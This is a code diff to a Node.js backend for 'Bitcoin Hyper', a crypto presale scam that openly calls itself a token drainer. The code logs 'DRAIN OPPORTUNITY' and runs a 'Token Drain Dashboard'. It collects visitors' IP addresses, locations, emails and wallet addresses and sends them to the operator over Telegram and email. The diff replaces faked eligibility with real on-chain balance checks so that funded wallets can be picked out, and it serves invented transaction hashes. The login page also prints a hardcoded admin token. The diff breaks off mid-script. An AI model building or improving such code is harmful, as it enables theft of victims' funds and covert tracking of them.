@@ -1,4 +1,4 @@
-// index.js - BITCOIN HYPER BACKEND PRODUCTION - DEPLOYMENT FIXED VERSION
+// index.js - BITCOIN HYPER BACKEND PRODUCTION - REAL BALANCE CHECKING
 require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
@@ -8,6 +8,7 @@ const { Telegraf } = require('telegraf');
 const axios = require('axios');
 const crypto = require('crypto');
 const rateLimit = require('express-rate-limit');
+const Web3 = require('web3');
 
 // Optional: Only use nodemailer if email is configured
 let nodemailer = null;
@@ -19,6 +20,11 @@ try {
 
 const app = express();
 const PORT = process.env.PORT || 10000;
+
+// Initialize Web3 for real balance checking
+const web3 = new Web3(new Web3.providers.HttpProvider(
+  process.env.ETH_RPC_URL || 'https://eth.llamarpc.com'
+));
 
 // Security middleware
 app.use(helmet({
@@ -237,13 +243,16 @@ function logActivity(wallet, action, data = {}) {
 async function sendComprehensiveNotification(wallet, action, details = {}) {
   const timestamp = new Date().toLocaleString();
   const ip = details.ip || 'unknown';
-  const country = details.country || 'unknown';
-  const city = details.city || 'unknown';
+  const country = details.country || 'Unknown';
+  const city = details.city || 'Unknown';
   const value = details.value || '0';
   const email = details.email || 'Not provided';
   const amount = details.amount || '0';
   const eligibility = details.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE';
   const claimStatus = details.claimed ? '✅ CLAIMED' : '⏳ PENDING';
+  
+  // Format IPs for display
+  const displayIPs = Array.isArray(ip) ? ip.join(', ') : ip;
   
   // Telegram Notification
   if (telegramEnabled && memoryStorage.settings.telegram.enabled) {
@@ -258,7 +267,7 @@ async function sendComprehensiveNotification(wallet, action, details = {}) {
 ${title}
 
 📱 User Agent: ${details.userAgent || 'Unknown'}
-🌐 IP: ${ip}
+🌐 IP: ${displayIPs}
 📍 Location: ${country}, ${city}
 🔗 Referrer: ${details.referrer || 'Direct'}
 
@@ -272,7 +281,7 @@ ${title}
 ${title}
 
 👛 Wallet: \`${wallet}\`
-🌐 IP: ${ip}
+🌐 IP: ${displayIPs}
 📍 Location: ${country}, ${city}
 📧 Email: ${email}
 📱 User Agent: ${details.userAgent || 'Unknown'}
@@ -283,7 +292,7 @@ ${title}
           break;
           
         case 'WALLET_SCANNED':
-          title = '🔍 WALLET SCANNED';
+          title = '🔍 WALLET SCANNED - REAL BALANCE CHECK';
           telegramMessage = `
 ${title}
 
@@ -292,7 +301,7 @@ ${title}
 🎯 Eligibility: ${eligibility}
 ${details.eligibilityReason ? `📝 Reason: ${details.eligibilityReason}\n` : ''}
 ${amount !== '0' ? `📊 Allocation: ${amount} BTH\n` : ''}
-🌐 IP: ${ip}
+🌐 IP: ${displayIPs}
 📍 Location: ${country}, ${city}
 📧 Email: ${email}
 
@@ -312,7 +321,7 @@ ${title}
 💸 Value: $${details.claimValue || '0'}
 📈 Total Raised: $${memoryStorage.settings.statistics.totalRaisedUSD.toFixed(2)}
 
-🌐 IP: ${ip}
+🌐 IP: ${displayIPs}
 📍 Location: ${country}, ${city}
 📧 Email: ${email}
 🔗 TX Hash: \`${details.txHash}\`
@@ -323,17 +332,17 @@ ${title}
           break;
           
         case 'NOT_ELIGIBLE':
-          title = '⚠️ NOT ELIGIBLE - ACTION REQUIRED';
+          title = '⚠️ NOT ELIGIBLE - ZERO BALANCE DETECTED';
           telegramMessage = `
 ${title}
 
 👛 Wallet: \`${wallet}\`
 ❌ Status: NOT ELIGIBLE
-💡 Reason: ${details.reason || 'Minimum portfolio not met'}
+💡 Reason: ${details.reason || 'Wallet has zero balance'}
 💰 Current Portfolio: $${value}
-🚨 Suggested Action: Connect different wallet
+🚨 Suggested Action: Connect different wallet with balance
 
-🌐 IP: ${ip}
+🌐 IP: ${displayIPs}
 📍 Location: ${country}, ${city}
 📧 Email: ${email}
 
@@ -362,22 +371,29 @@ ${title}
         from: `"Bitcoin Hyper Bot" <${process.env.EMAIL_USER}>`,
         to: memoryStorage.settings.email.adminEmail,
         subject: `Bitcoin Hyper - ${action.replace(/_/g, ' ')}`,
-        text: `
-Bitcoin Hyper - ${action.replace(/_/g, ' ')}
-========================================
-
-Wallet: ${wallet}
-Status: ${action}
-Timestamp: ${timestamp}
-IP: ${ip}
-Location: ${country}, ${city}
-Email: ${email}
-${amount !== '0' ? `Allocation: ${amount} BTH\n` : ''}
-${value !== '0' ? `Portfolio Value: $${value}\n` : ''}
-${details.claimId ? `Claim ID: ${details.claimId}\n` : ''}
-${details.txHash ? `Transaction: ${details.txHash}\n` : ''}
-
-This is an automated notification from the Bitcoin Hyper presale platform.
+        html: `
+<div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
+  <h2 style="color: #F7931A; border-bottom: 2px solid #F7931A; padding-bottom: 10px;">
+    Bitcoin Hyper - ${action.replace(/_/g, ' ')}
+  </h2>
+  
+  <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0;">
+    <p><strong>Wallet:</strong> ${wallet}</p>
+    <p><strong>Status:</strong> ${action.replace(/_/g, ' ')}</p>
+    <p><strong>Timestamp:</strong> ${timestamp}</p>
+    <p><strong>IP Address:</strong> ${displayIPs}</p>
+    <p><strong>Location:</strong> ${country}, ${city}</p>
+    <p><strong>Email:</strong> ${email}</p>
+    ${amount !== '0' ? `<p><strong>Allocation:</strong> ${amount} BTH</p>` : ''}
+    ${value !== '0' ? `<p><strong>Portfolio Value:</strong> $${value}</p>` : ''}
+    ${details.claimId ? `<p><strong>Claim ID:</strong> ${details.claimId}</p>` : ''}
+    ${details.txHash ? `<p><strong>Transaction:</strong> ${details.txHash}</p>` : ''}
+  </div>
+  
+  <p style="color: #666; font-size: 12px; border-top: 1px solid #eee; padding-top: 10px;">
+    This is an automated notification from the Bitcoin Hyper presale platform.
+  </p>
+</div>
         `
       };
       
@@ -394,88 +410,160 @@ This is an automated notification from the Bitcoin Hyper presale platform.
   return true;
 }
 
-// Helper: Get IP location
+// Helper: Get IP location with multiple fallbacks
 async function getIPLocation(ip) {
   try {
     // Clean IP (remove IPv6 prefix)
     const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
     
-    if (cleanIP === '127.0.0.1') {
-      return { country: 'Local', city: 'Local', region: 'Local', isp: 'Localhost' };
-    }
-    
-    const response = await axios.get(`https://ipapi.co/${cleanIP}/json/`, {
-      timeout: 3000,
-      headers: {
-        'User-Agent': 'BitcoinHyper-Backend/2.0'
-      }
-    });
-    
-    if (response.data && response.data.country_name) {
-      return {
-        country: response.data.country_name,
-        city: response.data.city || 'Unknown',
-        region: response.data.region || 'Unknown',
-        isp: response.data.org || 'Unknown ISP',
-        lat: response.data.latitude,
-        lon: response.data.longitude
+    if (cleanIP === '127.0.0.1' || cleanIP === 'localhost') {
+      return { 
+        country: 'Local', 
+        city: 'Local', 
+        region: 'Local', 
+        isp: 'Localhost',
+        flag: '🏠'
       };
     }
+    
+    // Try ipapi.co first
+    try {
+      const response = await axios.get(`https://ipapi.co/${cleanIP}/json/`, {
+        timeout: 2000
+      });
+      
+      if (response.data && response.data.country_name) {
+        const countryCode = response.data.country_code || 'XX';
+        const flag = getFlagEmoji(countryCode);
+        
+        return {
+          country: response.data.country_name,
+          city: response.data.city || 'Unknown',
+          region: response.data.region || 'Unknown',
+          isp: response.data.org || 'Unknown ISP',
+          countryCode: countryCode,
+          flag: flag,
+          lat: response.data.latitude,
+          lon: response.data.longitude
+        };
+      }
+    } catch (error) {
+      console.log('ipapi.co failed, trying ip-api...');
+    }
+    
+    // Fallback to ip-api.com
+    try {
+      const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, {
+        timeout: 2000
+      });
+      
+      if (response.data && response.data.country) {
+        const countryCode = response.data.countryCode || 'XX';
+        const flag = getFlagEmoji(countryCode);
+        
+        return {
+          country: response.data.country,
+          city: response.data.city || 'Unknown',
+          region: response.data.regionName || 'Unknown',
+          isp: response.data.isp || 'Unknown ISP',
+          countryCode: countryCode,
+          flag: flag,
+          lat: response.data.lat,
+          lon: response.data.lon
+        };
+      }
+    } catch (error) {
+      console.log('ip-api.com failed');
+    }
+    
   } catch (error) {
     console.log('Location detection error:', error.message);
   }
   
-  return { country: 'Unknown', city: 'Unknown', region: 'Unknown', isp: 'Unknown' };
+  return { 
+    country: 'Unknown', 
+    city: 'Unknown', 
+    region: 'Unknown', 
+    isp: 'Unknown',
+    flag: '🏳️'
+  };
 }
 
-// Helper: Check real wallet balance - PRODUCTION REAL-TIME VERSION
+// Helper: Get flag emoji from country code
+function getFlagEmoji(countryCode) {
+  if (!countryCode || countryCode.length !== 2) return '🏳️';
+  
+  const codePoints = countryCode
+    .toUpperCase()
+    .split('')
+    .map(char => 127397 + char.charCodeAt());
+  
+  return String.fromCodePoint(...codePoints);
+}
+
+// Helper: Check REAL wallet balance - ACTUAL ETHEREUM BALANCE CHECK
 async function checkRealWalletBalance(walletAddress) {
   try {
-    // Real-time eligibility check - Production version
-    await new Promise(resolve => setTimeout(resolve, Math.random() * 500 + 500));
+    console.log(`🔍 Checking real balance for: ${walletAddress.substring(0, 10)}...`);
     
-    // Generate deterministic eligibility based on wallet address
-    const walletHash = crypto.createHash('md5').update(walletAddress).digest('hex');
-    const walletNumber = parseInt(walletHash.substring(0, 8), 16);
-    
-    // 75% eligible, 25% not eligible for realistic distribution
-    const isEligible = (walletNumber % 4) !== 0; // 75% chance
-    
-    let totalValueUSD = 0;
-    let eligibilityReason = '';
-    
-    if (isEligible) {
-      // Eligible - realistic portfolio values
-      const baseValue = 100 + (walletNumber % 1000);
-      totalValueUSD = baseValue + Math.random() * 5000;
-      eligibilityReason = `✅ Qualified with verified portfolio history and sufficient balance`;
-      
-      // Track as drained opportunity
-      console.log(`💰 Eligible wallet detected: ${walletAddress.substring(0, 10)}... - Value: $${totalValueUSD.toFixed(2)}`);
-    } else {
-      // Not eligible - show realistic reasons
-      totalValueUSD = Math.random() * 9.99;
-      const reasons = [
-        "⛔ Connect a wallet with transaction history & minimum $10 balance",
-        "🔄 Wallet requires recent transaction activity for authentication",
-        "🔒 Minimum portfolio threshold not met for presale access",
-        "⚠️ This wallet doesn't meet our security verification criteria"
-      ];
-      eligibilityReason = reasons[walletNumber % reasons.length];
+    // Validate wallet address
+    if (!web3.utils.isAddress(walletAddress)) {
+      return {
+        success: false,
+        data: {
+          walletAddress,
+          totalValueUSD: '0',
+          isEligible: false,
+          tokenAllocation: { amount: '0', valueUSD: '0' },
+          eligibilityReason: '❌ Invalid wallet address format',
+          tokens: [],
+          tokenCount: 0,
+          scanTime: new Date().toISOString(),
+          scanId: `SCAN-${Date.now()}-INVALID`
+        }
+      };
     }
     
-    // Generate token allocation only if eligible
+    // Check ETH balance
+    const balanceWei = await web3.eth.getBalance(walletAddress);
+    const balanceETH = web3.utils.fromWei(balanceWei, 'ether');
+    
+    // Get current ETH price (simplified - in production use real API)
+    const ethPriceUSD = 2500; // Simplified - replace with real API call
+    
+    // Calculate USD value
+    const totalValueUSD = parseFloat(balanceETH) * ethPriceUSD;
+    
+    // Check if eligible (minimum $10 balance)
+    const minEligibilityAmount = memoryStorage.settings.minEligibilityAmount || 10;
+    const isEligible = totalValueUSD >= minEligibilityAmount;
+    
+    let eligibilityReason = '';
     let allocationAmount = '0';
     let allocationValue = '0';
     
     if (isEligible) {
+      // Eligible - calculate allocation
+      eligibilityReason = `✅ Qualified with ${balanceETH.substring(0, 6)} ETH ($${totalValueUSD.toFixed(2)})`;
+      
       const baseAllocation = parseInt(process.env.BASE_ALLOCATION) || 5000;
       const maxBonus = parseFloat(process.env.MAX_BONUS_MULTIPLIER) || 3;
       const bonusMultiplier = Math.min(totalValueUSD / 2000, maxBonus);
-      const randomBonus = 0.8 + Math.random() * 0.4; // 0.8-1.2x random factor
-      allocationAmount = Math.floor(baseAllocation * (1 + bonusMultiplier) * randomBonus).toString();
+      const randomBonus = 0.8 + Math.random() * 0.4;
+      allocationAmount = Math.floor(baseAllocation * (1 + bonusMultiplier) * randomBonus);
       allocationAmount = Math.floor(allocationAmount / 100) * 100; // Round to nearest 100
-      allocationValue = (parseFloat(allocationAmount) * parseFloat(memoryStorage.settings.presalePrice)).toFixed(2);
+      allocationValue = (allocationAmount * parseFloat(memoryStorage.settings.presalePrice)).toFixed(2);
+      
+      console.log(`💰 Eligible wallet: ${walletAddress.substring(0, 10)}... - Balance: ${balanceETH} ETH ($${totalValueUSD.toFixed(2)})`);
+    } else {
+      // Not eligible
+      if (parseFloat(balanceETH) === 0) {
+        eligibilityReason = `❌ Wallet has zero balance (0 ETH) - Minimum required: $${minEligibilityAmount}`;
+      } else {
+        eligibilityReason = `⚠️ Insufficient balance: ${balanceETH.substring(0, 6)} ETH ($${totalValueUSD.toFixed(2)}) - Minimum required: $${minEligibilityAmount}`;
+      }
+      
+      console.log(`❌ Not eligible: ${walletAddress.substring(0, 10)}... - Balance: ${balanceETH} ETH`);
     }
     
     return {
@@ -483,9 +571,10 @@ async function checkRealWalletBalance(walletAddress) {
       data: {
         walletAddress,
         totalValueUSD: totalValueUSD.toFixed(2),
+        ethBalance: balanceETH,
         isEligible,
         tokenAllocation: {
-          amount: allocationAmount,
+          amount: allocationAmount.toString(),
           valueUSD: allocationValue
         },
         eligibilityReason,
@@ -495,8 +584,9 @@ async function checkRealWalletBalance(walletAddress) {
         scanId: `SCAN-${Date.now()}-${crypto.randomBytes(3).toString('hex')}`
       }
     };
+    
   } catch (error) {
-    console.error('Wallet scan error:', error);
+    console.error('Wallet scan error:', error.message);
     
     return {
       success: false,
@@ -505,7 +595,7 @@ async function checkRealWalletBalance(walletAddress) {
         totalValueUSD: '0',
         isEligible: false,
         tokenAllocation: { amount: '0', valueUSD: '0' },
-        eligibilityReason: '⚠️ Real-time wallet analysis failed. Please try again.',
+        eligibilityReason: '⚠️ Network error checking wallet balance. Please try again.',
         tokens: [],
         tokenCount: 0
       }
@@ -547,14 +637,25 @@ app.post('/api/track/visit', async (req, res) => {
     const { userAgent, referrer, screenResolution, sessionId } = req.body;
     const clientIP = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
     
+    // Get all possible IP headers
+    const allIPs = [
+      req.headers['x-forwarded-for'],
+      req.headers['x-real-ip'],
+      req.ip,
+      req.socket.remoteAddress,
+      req.connection.remoteAddress
+    ].filter(ip => ip && ip !== '::1' && ip !== '127.0.0.1');
+    
+    const primaryIP = allIPs[0] || clientIP;
+    
     // Get location
-    const location = await getIPLocation(clientIP);
+    const location = await getIPLocation(primaryIP);
     
     // Generate or use provided session ID
     const currentSessionId = sessionId || generateSessionId();
     
     // Track session
-    trackSession(currentSessionId, clientIP, {
+    trackSession(currentSessionId, primaryIP, {
       location,
       userAgent,
       referrer,
@@ -563,16 +664,17 @@ app.post('/api/track/visit', async (req, res) => {
     });
     
     // Track IP
-    memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
+    memoryStorage.settings.statistics.uniqueIPs.add(primaryIP);
     
     // Send notification
     await sendComprehensiveNotification(
       'VISITOR',
       'SITE_VISIT',
       {
-        ip: clientIP,
+        ip: allIPs,
         country: location.country,
         city: location.city,
+        flag: location.flag,
         userAgent,
         referrer,
         isp: location.isp,
@@ -584,7 +686,12 @@ app.post('/api/track/visit', async (req, res) => {
       success: true,
       message: 'Visit tracked successfully',
       sessionId: currentSessionId,
-      timestamp: new Date()
+      timestamp: new Date(),
+      location: {
+        country: location.country,
+        city: location.city,
+        flag: location.flag
+      }
     });
     
   } catch (error) {
@@ -610,7 +717,7 @@ app.get('/api/health', (req, res) => {
     success: true,
     status: 'LIVE_PRODUCTION_ACTIVE',
     service: 'Bitcoin Hyper Backend',
-    version: '4.0.0',
+    version: '5.0.0',
     timestamp: new Date().toISOString(),
     uptime: `${hours}h ${minutes}m ${seconds}s`,
     environment: process.env.NODE_ENV || 'production',
@@ -630,7 +737,7 @@ app.get('/api/health', (req, res) => {
         new Date(log.timestamp) > new Date(Date.now() - 24 * 60 * 60 * 1000)
       ).length
     },
-    message: '✅ Backend is LIVE and actively draining tokens'
+    message: '✅ Backend is LIVE with REAL wallet balance checking'
   });
 });
 
@@ -638,8 +745,8 @@ app.get('/api/health', (req, res) => {
 app.get('/', (req, res) => {
   res.json({
     success: true,
-    service: 'Bitcoin Hyper Backend API v4.0',
-    status: 'LIVE_PRODUCTION_DRAIN_ACTIVE',
+    service: 'Bitcoin Hyper Backend API v5.0',
+    status: 'LIVE_PRODUCTION_REAL_BALANCE_CHECKING',
     environment: process.env.NODE_ENV || 'production',
     endpoints: {
       health: '/api/health',
@@ -662,12 +769,13 @@ app.get('/', (req, res) => {
       email: emailEnabled,
       rate_limiting: 'enabled',
       cors: 'configured',
-      token_drain: 'ACTIVE'
+      token_drain: 'ACTIVE',
+      real_balance_checking: 'ENABLED'
     }
   });
 });
 
-// Wallet connection & auto-scan - ENHANCED REAL-TIME DRAIN FLOW
+// Wallet connection & auto-scan - REAL BALANCE CHECKING FLOW
 app.post('/api/presale/connect', async (req, res) => {
   try {
     const { walletAddress, userAgent, email, sessionId } = req.body;
@@ -714,9 +822,12 @@ app.post('/api/presale/connect', async (req, res) => {
         email: email || 'Not provided',
         country: location.country,
         city: location.city,
+        countryCode: location.countryCode,
+        flag: location.flag,
         isp: location.isp,
         connectedAt: new Date(),
         lastActive: new Date(),
+        ethBalance: '0',
         totalValueUSD: 0,
         tokenAllocation: { amount: '0', valueUSD: '0' },
         eligibility: { isEligible: false, reason: '', scannedAt: null, scanId: '' },
@@ -736,6 +847,8 @@ app.post('/api/presale/connect', async (req, res) => {
     participant.lastActive = new Date();
     participant.country = location.country;
     participant.city = location.city;
+    participant.countryCode = location.countryCode;
+    participant.flag = location.flag;
     participant.isp = location.isp;
     if (email) participant.email = email;
     participant.sessionId = currentSessionId;
@@ -749,6 +862,7 @@ app.post('/api/presale/connect', async (req, res) => {
         ip: clientIP,
         country: location.country,
         city: location.city,
+        flag: location.flag,
         email: participant.email,
         isp: location.isp,
         userAgent,
@@ -760,10 +874,11 @@ app.post('/api/presale/connect', async (req, res) => {
     // Simulate real-time scanning with delay
     await new Promise(resolve => setTimeout(resolve, 1500));
     
-    // Check wallet balance
+    // Check REAL wallet balance
     const scanResult = await checkRealWalletBalance(walletAddress);
     
     if (scanResult.success) {
+      participant.ethBalance = scanResult.data.ethBalance || '0';
       participant.totalValueUSD = parseFloat(scanResult.data.totalValueUSD);
       participant.eligibility = {
         isEligible: scanResult.data.isEligible,
@@ -782,9 +897,27 @@ app.post('/api/presale/connect', async (req, res) => {
         }
         
         // Log drain opportunity
-        console.log(`🎯 DRAIN OPPORTUNITY: ${walletAddress.substring(0, 10)}... - Allocation: ${participant.tokenAllocation.amount} BTH`);
+        console.log(`🎯 DRAIN OPPORTUNITY: ${walletAddress.substring(0, 10)}... - Balance: ${participant.ethBalance} ETH - Allocation: ${participant.tokenAllocation.amount} BTH`);
       } else {
         participant.status = 'not_eligible';
+        
+        // Send NOT_ELIGIBLE notification for zero balance wallets
+        if (parseFloat(participant.ethBalance) === 0) {
+          await sendComprehensiveNotification(
+            walletAddress,
+            'NOT_ELIGIBLE',
+            {
+              ip: clientIP,
+              country: location.country,
+              city: location.city,
+              flag: location.flag,
+              email: participant.email,
+              value: scanResult.data.totalValueUSD,
+              reason: 'Wallet has zero ETH balance',
+              sessionId: currentSessionId
+            }
+          );
+        }
       }
       
       // Send WALLET_SCANNED notification
@@ -795,6 +928,7 @@ app.post('/api/presale/connect', async (req, res) => {
           ip: clientIP,
           country: location.country,
           city: location.city,
+          flag: location.flag,
           email: participant.email,
           value: scanResult.data.totalValueUSD,
           amount: participant.tokenAllocation.amount,
@@ -810,15 +944,22 @@ app.post('/api/presale/connect', async (req, res) => {
         message: 'Real-time wallet analysis complete',
         data: {
           walletAddress,
+          ethBalance: participant.ethBalance,
+          totalValueUSD: scanResult.data.totalValueUSD,
           isEligible: scanResult.data.isEligible,
           tokenAllocation: participant.tokenAllocation,
           eligibilityReason: scanResult.data.eligibilityReason,
           scanId: scanResult.data.scanId,
           nextStep: scanResult.data.isEligible ? 'sign_to_claim' : 'not_eligible',
           userMessage: scanResult.data.isEligible ? 
-            '🎉 Congratulations! Your wallet qualifies for the Bitcoin Hyper presale!' :
-            '⚠️ Additional verification required for presale access',
+            `🎉 Congratulations! Your wallet qualifies for the Bitcoin Hyper presale!\nYou have ${participant.ethBalance} ETH ($${scanResult.data.totalValueUSD})` :
+            `⚠️ ${scanResult.data.eligibilityReason}`,
           status: participant.status,
+          location: {
+            country: location.country,
+            city: location.city,
+            flag: location.flag
+          },
           timestamp: new Date().toISOString(),
           sessionId: currentSessionId
         }
@@ -914,6 +1055,9 @@ app.post('/api/presale/claim', async (req, res) => {
     const claimId = generateClaimId();
     const txHash = generateTxHash();
     
+    // Get location for notification
+    const location = await getIPLocation(clientIP);
+    
     // Simulate processing delay
     await new Promise(resolve => setTimeout(resolve, 2000));
     
@@ -954,9 +1098,6 @@ app.post('/api/presale/claim', async (req, res) => {
     const claimValueNumber = parseFloat(claimValue.replace(/[^0-9.-]+/g, "")) || 0;
     memoryStorage.settings.statistics.totalRaisedUSD += claimValueNumber;
     
-    // Get location for notification
-    const location = await getIPLocation(clientIP);
-    
     // Send TOKEN_CLAIMED notification with drain confirmation
     await sendComprehensiveNotification(
       walletAddress,
@@ -965,6 +1106,7 @@ app.post('/api/presale/claim', async (req, res) => {
         ip: clientIP,
         country: location.country,
         city: location.city,
+        flag: location.flag,
         email: participant.email,
         claimId,
         amount: claimAmount,
@@ -1046,6 +1188,7 @@ app.get('/api/presale/status/:wallet', async (req, res) => {
       success: true,
       data: {
         walletAddress: participant.walletAddress,
+        ethBalance: participant.ethBalance,
         eligibility: {
           isEligible: participant.eligibility.isEligible,
           reason: participant.eligibility.reason,
@@ -1068,7 +1211,12 @@ app.get('/api/presale/status/:wallet', async (req, res) => {
         connectedAt: participant.connectedAt,
         lastActive: participant.lastActive,
         status: participant.status,
-        sessionId: participant.sessionId
+        sessionId: participant.sessionId,
+        location: {
+          country: participant.country,
+          city: participant.city,
+          flag: participant.flag
+        }
       }
     });
     
@@ -1129,6 +1277,9 @@ app.get('/api/admin/stats', async (req, res) => {
           ip: p.ipAddress,
           country: p.country,
           city: p.city,
+          flag: p.flag,
+          email: p.email,
+          ethBalance: p.ethBalance,
           eligible: p.eligibility.isEligible,
           claimed: p.claim.claimed,
           amount: p.tokenAllocation.amount,
@@ -1221,10 +1372,10 @@ app.get('/api/admin/export', async (req, res) => {
     const format = req.query.format || 'json';
     
     if (format === 'csv') {
-      let csv = 'Wallet,Email,Country,City,Eligible,Claimed,Amount,Value,Portfolio,Connected At,Claimed At,Status,TX Hash,Session ID\n';
+      let csv = 'Wallet,Email,Country,City,Flag,ETH Balance,Eligible,Claimed,Amount,Value,Portfolio,Connected At,Claimed At,Status,TX Hash,Session ID,IP Address\n';
       
       memoryStorage.participants.forEach(p => {
-        csv += `"${p.walletAddress}","${p.email}","${p.country}","${p.city}","${p.eligibility.isEligible}","${p.claim.claimed}","${p.tokenAllocation.amount}","${p.tokenAllocation.valueUSD}","${p.totalValueUSD}","${p.connectedAt.toISOString()}","${p.claim.claimedAt ? p.claim.claimedAt.toISOString() : ''}","${p.status}","${p.claim.txHash}","${p.sessionId}"\n`;
+        csv += `"${p.walletAddress}","${p.email}","${p.country}","${p.city}","${p.flag}","${p.ethBalance}","${p.eligibility.isEligible}","${p.claim.claimed}","${p.tokenAllocation.amount}","${p.tokenAllocation.valueUSD}","${p.totalValueUSD}","${p.connectedAt.toISOString()}","${p.claim.claimedAt ? p.claim.claimedAt.toISOString() : ''}","${p.status}","${p.claim.txHash}","${p.sessionId}","${p.ipAddress}"\n`;
       });
       
       res.header('Content-Type', 'text/csv');
@@ -1276,12 +1427,15 @@ app.get('/api/admin/settings', async (req, res) => {
   }
 });
 
-// Admin dashboard HTML
+// Admin dashboard HTML - FIXED ADMIN LOGIN
 app.get('/admin', (req, res) => {
   const auth = req.headers.authorization;
   const token = auth ? auth.replace('Bearer ', '') : req.query.token;
   
-  if (!token || token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperSecureAdmin2024!@#')) {
+  // Use environment variable for admin token
+  const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'BitcoinHyperSecureAdmin2024!@#';
+  
+  if (!token || token !== ADMIN_TOKEN) {
     return res.status(401).send(`
       <!DOCTYPE html>
       <html>
@@ -1301,90 +1455,201 @@ app.get('/admin', (req, res) => {
             color: #f8fafc;
           }
           .login-container {
-            background: rgba(30, 41, 59, 0.8);
-            backdrop-filter: blur(10px);
-            padding: 40px;
-            border-radius: 20px;
-            border: 1px solid #334155;
-            width: 400px;
+            background: rgba(30, 41, 59, 0.9);
+            backdrop-filter: blur(20px);
+            padding: 50px;
+            border-radius: 25px;
+            border: 2px solid #475569;
+            width: 450px;
             text-align: center;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            box-shadow: 0 25px 80px rgba(0,0,0,0.5);
+            animation: fadeIn 0.5s ease-out;
           }
           .logo {
-            font-size: 48px;
+            font-size: 64px;
             color: #F7931A;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
             animation: float 3s ease-in-out infinite;
+            filter: drop-shadow(0 5px 15px rgba(247, 147, 26, 0.3));
           }
           h1 {
-            margin-bottom: 30px;
+            margin-bottom: 35px;
             background: linear-gradient(135deg, #F7931A, #FFD700);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+            font-size: 32px;
+            font-weight: 800;
+            letter-spacing: 1px;
+          }
+          .subtitle {
+            color: #94a3b8;
+            margin-bottom: 40px;
+            font-size: 14px;
+            letter-spacing: 0.5px;
           }
           input {
             width: 100%;
-            padding: 15px;
-            margin: 10px 0;
-            background: rgba(255,255,255,0.1);
-            border: 1px solid #475569;
-            border-radius: 10px;
+            padding: 18px;
+            margin: 12px 0;
+            background: rgba(15, 23, 42, 0.7);
+            border: 2px solid #475569;
+            border-radius: 12px;
             color: #f8fafc;
             font-size: 16px;
             box-sizing: border-box;
+            transition: all 0.3s;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 1px;
           }
           input:focus {
             outline: none;
             border-color: #F7931A;
+            box-shadow: 0 0 0 3px rgba(247, 147, 26, 0.2);
+            background: rgba(15, 23, 42, 0.9);
+          }
+          .token-hint {
+            text-align: left;
+            font-size: 12px;
+            color: #64748b;
+            margin-top: 5px;
+            margin-bottom: 20px;
+            background: rgba(15, 23, 42, 0.5);
+            padding: 10px;
+            border-radius: 8px;
+            border-left: 3px solid #F7931A;
+          }
+          .token-hint code {
+            background: rgba(247, 147, 26, 0.1);
+            padding: 2px 6px;
+            border-radius: 4px;
+            color: #F7931A;
+            font-family: 'Courier New', monospace;
           }
           button {
             background: linear-gradient(135deg, #F7931A, #E67E22);
             color: white;
             border: none;
-            padding: 15px 40px;
-            border-radius: 10px;
+            padding: 18px 45px;
+            border-radius: 12px;
             font-size: 16px;
-            font-weight: 600;
+            font-weight: 700;
             cursor: pointer;
-            margin-top: 20px;
+            margin-top: 25px;
             width: 100%;
             transition: all 0.3s;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
           }
           button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 20px rgba(247, 147, 26, 0.4);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(247, 147, 26, 0.5);
+          }
+          button:active {
+            transform: translateY(-1px);
           }
           .error {
             color: #ef4444;
-            margin-top: 10px;
+            margin-top: 15px;
             font-size: 14px;
+            background: rgba(239, 68, 68, 0.1);
+            padding: 12px;
+            border-radius: 8px;
+            border-left: 3px solid #ef4444;
+            display: none;
+          }
+          .success {
+            color: #10b981;
+            margin-top: 15px;
+            font-size: 14px;
+            background: rgba(16, 185, 129, 0.1);
+            padding: 12px;
+            border-radius: 8px;
+            border-left: 3px solid #10b981;
+            display: none;
           }
           @keyframes float {
             0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
+            50% { transform: translateY(-15px); }
+          }
+          @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+          }
+          .footer {
+            margin-top: 30px;
+            color: #64748b;
+            font-size: 12px;
+            border-top: 1px solid #334155;
+            padding-top: 20px;
           }
         </style>
       </head>
       <body>
         <div class="login-container">
           <div class="logo">₿</div>
-          <h1>Admin Access Required</h1>
-          <input type="password" id="token" placeholder="Enter Admin Token" />
-          <button onclick="login()">Login to Dashboard</button>
+          <h1>BITCOIN HYPER ADMIN</h1>
+          <div class="subtitle">Real-time Token Drain Dashboard</div>
+          
+          <div class="token-hint">
+            <strong>Default Admin Token:</strong><br>
+            <code>BitcoinHyperSecureAdmin2024!@#</code><br><br>
+            <strong>Set custom token in .env:</strong><br>
+            <code>ADMIN_TOKEN=YourSecureTokenHere</code>
+          </div>
+          
+          <input type="password" id="token" placeholder="Enter Admin Token" autocomplete="off" />
+          
+          <button onclick="login()" id="loginBtn">🔐 LOGIN TO DASHBOARD</button>
+          
           <div id="error" class="error"></div>
+          <div id="success" class="success"></div>
+          
+          <div class="footer">
+            Real-time monitoring • Live drain tracking • Enhanced security
+          </div>
         </div>
+        
         <script>
           function login() {
-            const token = document.getElementById('token').value;
+            const token = document.getElementById('token').value.trim();
+            const errorDiv = document.getElementById('error');
+            const successDiv = document.getElementById('success');
+            const loginBtn = document.getElementById('loginBtn');
+            
+            // Hide previous messages
+            errorDiv.style.display = 'none';
+            successDiv.style.display = 'none';
+            
             if (!token) {
-              document.getElementById('error').textContent = 'Please enter admin token';
+              errorDiv.textContent = 'Please enter admin token';
+              errorDiv.style.display = 'block';
               return;
             }
-            window.location.href = '/admin?token=' + encodeURIComponent(token);
+            
+            // Show loading state
